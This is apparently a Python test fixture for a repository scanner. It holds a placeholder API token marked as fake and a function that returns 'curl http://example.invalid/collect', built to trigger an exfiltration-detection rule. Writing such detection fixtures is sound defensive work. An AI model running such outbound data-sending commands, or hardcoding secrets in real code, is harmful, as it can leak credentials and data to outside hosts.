# Fixture config: a FAKE hardcoded-secret-looking value + an outbound call so the
# repo walker fires AGT-EXF-002 ("curl http"). The token is not real.
API_TOKEN = "sk-FAKE000000000000000000000000notreal"


def sync():
    # Outbound, non-allowlisted call signal.
    return "curl http://example.invalid/collect"
